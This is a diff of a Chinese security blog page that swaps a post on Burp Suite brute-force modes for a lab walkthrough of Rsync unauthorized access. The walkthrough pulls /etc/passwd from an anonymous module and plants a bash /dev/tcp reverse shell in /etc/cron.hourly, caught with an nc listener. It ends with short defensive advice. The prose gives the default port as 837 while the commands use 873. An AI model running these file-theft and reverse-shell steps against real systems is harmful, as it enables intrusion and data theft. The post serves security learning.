@@ -17,7 +17,7 @@
   <meta name="description" content="">
   <meta name="author" content="booom">
   <meta name="keywords" content="">
-  <title>Burp Suite使用记录 - wiki</title>
+  <title>Rsync未授权访问 - wiki</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
 
@@ -165,8 +165,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2020-03-08 22:02" pubdate>
-        2020年3月8日 晚上
+      <time datetime="2020-11-02 17:24" pubdate>
+        2020年11月2日 下午
       </time>
     </span>
   
@@ -177,7 +177,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      688 字
+      368 字
     </span>
   
 
@@ -187,7 +187,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      7
+      5
        分钟
     </span>
   
@@ -217,31 +217,56 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto" id="post">
             <!-- SEO header -->
-            <h1 style="display: none">Burp Suite使用记录</h1>
+            <h1 style="display: none">Rsync未授权访问</h1>
             
             <div class="markdown-body" id="post-body">
-              <p>之前学bp，学到了一点皮毛，知道怎么来爆破密码，但是对具体的操作没有进行实验，这几天闲了，再重新把爆破这部分做了一遍。ヾ(•ω•`)o</p>
-<h2 id="Burp-Suite"><a href="#Burp-Suite" class="headerlink" title="Burp Suite"></a>Burp Suite</h2><h3 id="Intruder-暴力破解模块"><a href="#Intruder-暴力破解模块" class="headerlink" title="Intruder_暴力破解模块"></a>Intruder_暴力破解模块</h3><p>抓到数据包之后，发送到Intruder。</p>
-<p><img src="http://ww1.sinaimg.cn/large/006sKd2tly1gdqc7x6sukj30yy0c3myo.jpg" srcset="/img/loading.gif" alt="发送到爆破模块"></p>
-<p>设置攻击目标和目标端口</p>
-<p><img src="http://ww1.sinaimg.cn/large/006sKd2tly1gdqcc9oon9j30yz09edga.jpg" srcset="/img/loading.gif" alt="设置攻击目标.png"></p>
-<p>设置变量和攻击模式。</p>
-<p><img src="http://ww1.sinaimg.cn/large/006sKd2tly1gdqcalndr0j30yy0igq4d.jpg" srcset="/img/loading.gif" alt="攻击类型"></p>
-<h4 id="attack-type-攻击类型介绍"><a href="#attack-type-攻击类型介绍" class="headerlink" title="attack type 攻击类型介绍"></a>attack type 攻击类型介绍</h4><ul>
-<li><p><strong>Sniper - 单个变量使用一个字典的情况。从上到下，单个匹配。</strong>这个是我们最常用的，Sniper是狙击手的意思。这个模式会使用单一的payload【就是导入字典的payload】组。它会针对每个position中$$位置设置payload。这种攻击类型适合对常见漏洞中的请求参数单独地进行测试。攻击中的请求总数应该是position数量和payload数量的乘积。</p>
-</li>
-<li><p><strong>Battering ram – 多个变量使用同一个字典的情况。A变量=B变量，每次两个位置用同样的密码。</strong>这一模式是使用单一的payload组。它会重复payload并且一次把所有相同的payload放入指定的位置中。这种攻击适合那种需要在请求中把相同的输入放到多个位置的情况。请求的总数是payload组中payload的总数。简单说就是一个playload字典同时应用到多个position中。</p>
-</li>
-<li><p><strong>Pitchfork - 多个变量使用不同字典的情况。A字典的第一行对应B字典的第一行</strong>这一模式是使用多个payload组。对于定义的位置可以使用不同的payload组。攻击会同步迭代所有的payload组，把payload放入每个定义的位置中。比如：position中A处有a字典，B处有b字典，则a【1】将会对应b【1】进行attack处理，这种攻击类型非常适合那种不同位置中需要插入不同但相关的输入的情况。请求的数量应该是最小的payload组中的payload数量</p>
-</li>
-<li><p><strong>Cluster bomb – 交叉爆破，每一种组合都会测试。多变量建议使用这个模式</strong>这种模式会使用多个payload组。每个定义的位置中有不同的payload组。攻击会迭代每个payload组，每种payload组合都会被测试一遍。比如：position中A处有a字典，B处有b字典，则两个字典将会循环搭配组合进行attack处理这种攻击适用于那种位置中需要不同且不相关或者未知的输入的攻击。攻击请求的总数是各payload组中payload数量的乘积。</p>
-</li>
-</ul>
-<h4 id="payloads"><a href="#payloads" class="headerlink" title="payloads"></a>payloads</h4><p><img src="http://ww1.sinaimg.cn/large/006sKd2tly1gdqcalndr0j30yy0igq4d.jpg" srcset="/img/loading.gif" alt="1583647566242.png"></p>
-<p>Burp Intruder包含以下几种attack type:</p>
-<blockquote>
-<p>Simple list–简单字典<br>Runtime file–运行文件<br>Custom iterator–自定义迭代器<br>Character substitution–字符替换</p>
-</blockquote>
+              <h1 id="Rsync-未授权访问漏洞"><a href="#Rsync-未授权访问漏洞" class="headerlink" title="Rsync 未授权访问漏洞"></a>Rsync 未授权访问漏洞</h1><h2 id="漏洞简介以及危害"><a href="#漏洞简介以及危害" class="headerlink" title="漏洞简介以及危害"></a>漏洞简介以及危害</h2><p>Rsync（remote synchronize）是一个远程数据同步工具，可通过 LAN/WAN 快速同步多台主机间的文件，也可以同步本地硬盘中的不同目录。Rsync 默认允许匿名访问，如果在配置文件中没有相关的用户认证以及文件授权，就会触发隐患。Rsync 的默认端口为 837。</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>靶机地址：192.168.2.137</p>
+<p>kali地址：192.168.2.132</p>
+<pre><code class="hljs 1c"><span class="hljs-meta"># 编译并启动docker容器</span>
+docker-compose build <span class="hljs-meta">&amp;&amp; docker-compose up -d</span></code></pre>
+
+<h2 id="未授权访问测试"><a href="#未授权访问测试" class="headerlink" title="未授权访问测试"></a>未授权访问测试</h2><pre><code class="hljs 1c"><span class="hljs-meta">#rsync rsync:<span class="hljs-comment">//&#123;target_ip&#125;/</span></span>
+
+rsync rsync:<span class="hljs-comment">//192.168.2.137:873/</span>
+rsync rsync:<span class="hljs-comment">//192.168.2.137:873/src</span></code></pre>
+
+<p><a href="https://imgchr.com/i/BD5ICF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/02/BD5ICF.png" srcset="/img/loading.gif" alt="BD5ICF.png"></a></p>
+<h2 id="利用rsync下载任意文件"><a href="#利用rsync下载任意文件" class="headerlink" title="利用rsync下载任意文件"></a>利用rsync下载任意文件</h2><pre><code class="hljs awk">rsync rsync:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">2.137</span>:<span class="hljs-number">873</span><span class="hljs-regexp">/src/</span>etc<span class="hljs-regexp">/passwd ./</span></code></pre>
+
+<p><a href="https://imgchr.com/i/BD57v9" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/02/BD57v9.png" srcset="/img/loading.gif" alt="BD57v9.png"></a></p>
+<h2 id="利用rsync反弹shell"><a href="#利用rsync反弹shell" class="headerlink" title="利用rsync反弹shell"></a>利用rsync反弹shell</h2><pre><code class="hljs jboss-cli"><span class="hljs-comment"># 下载crontab配置文件</span>
+rsync rsync:<span class="hljs-string">//192.168.2.137</span><span class="hljs-function">:873</span>/src/etc/crontab <span class="hljs-string">./</span>
+
+该环境crontab中
+17 *    * * *   root    <span class="hljs-keyword">cd</span> / &amp;&amp; run-parts <span class="hljs-params">--report</span> <span class="hljs-string">/etc/cron.hourly</span>
+表示每小时的第17分钟执行run-parts <span class="hljs-params">--report</span> <span class="hljs-string">/etc/cron.hourly</span></code></pre>
+
+<p><a href="https://imgchr.com/i/BD5zCD" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/02/BD5zCD.png" srcset="/img/loading.gif" alt="BD5zCD.png"></a></p>
+<pre><code class="hljs yaml"><span class="hljs-comment"># 写入bash并赋权</span>
+<span class="hljs-string">vim</span> <span class="hljs-string">nc</span>
+<span class="hljs-meta">---</span>
+<span class="hljs-comment">#!/bin/bash</span>
+<span class="hljs-string">/bin/bash</span> <span class="hljs-string">-i</span> <span class="hljs-string">&gt;&amp;</span> <span class="hljs-string">/dev/tcp/192.168.2.132/9999</span> <span class="hljs-number">0</span><span class="hljs-string">&gt;&amp;1</span>
+<span class="hljs-meta">---</span>
+<span class="hljs-string">chmod</span> <span class="hljs-number">777</span></code></pre>
+
+<p><a href="https://imgchr.com/i/BDI9vd" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/02/BDI9vd.png" srcset="/img/loading.gif" alt="BDI9vd.png"></a></p>
+<p>把nc文件上传</p>
+<pre><code class="hljs awk"><span class="hljs-comment"># 将文件上传至/etc/cron.hourly</span>
+rsync -av nc rsync:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">2.137</span>:<span class="hljs-number">873</span><span class="hljs-regexp">/src/</span>etc<span class="hljs-regexp">/cron.hourly</span></code></pre>
+
+<p><a href="https://imgchr.com/i/BDI8aV" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/02/BDI8aV.png" srcset="/img/loading.gif" alt="BDI8aV.png"></a></p>
+<p>开启本地监听</p>
+<pre><code class="hljs angelscript"># 本地监听<span class="hljs-number">9999</span>
+nc -lnvp <span class="hljs-number">9999</span></code></pre>
+
+<p><a href="https://imgchr.com/i/BDIYPU" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/02/BDIYPU.png" srcset="/img/loading.gif" alt="BDIYPU.png"></a></p>
+<p>反弹成功。</p>
+<h2 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h2><p>-账户认证：正确配置认证用户名及密码。</p>
+<p>-权限控制：使用合理的权限。</p>
+<p>-网络访问控制：控制接入源ip。</p>
+<p>-数据加密传输等</p>
 
             </div>
             <hr>
@@ -251,7 +276,7 @@
                   <div class="post-meta mr-3">
                     <i class="iconfont icon-category"></i>
                     
-                      <a class="hover-with-bg" href="/categories/tool/">tool</a>
+                      <a class="hover-with-bg" href="/categories/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/">未授权访问</a>
                     
                   </div>
                 
@@ -259,9 +284,7 @@
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/web/">web</a>
-                    
-                      <a class="hover-with-bg" href="/tags/Burp-Suite/">Burp Suite</a>
+                      <a class="hover-with-bg" href="/tags/cve/">cve</a>
                     
                   </div>
                 
@@ -274,9 +297,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2020/03/09/Vim/">
+                      <a href="/2020/11/02/OpenSSH-CVE-2016-6515/">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Vim练级攻略记录</span>
+                        <span class="hidden-mobile">OpenSSH-CVE-2016-6515</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -284,8 +307,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2020/03/05/DVWA-1/">
-                        <span class="hidden-mobile">DVWA-渗透测试入门</span>
+                      <a href="/2020/11/02/Weblogic-CVE-2020-2551/">
+                        <span class="hidden-mobile">Weblogic-CVE-2020-2551</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -481,7 +504,7 @@
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "Burp Suite使用记录&nbsp;",
+        "Rsync未授权访问&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
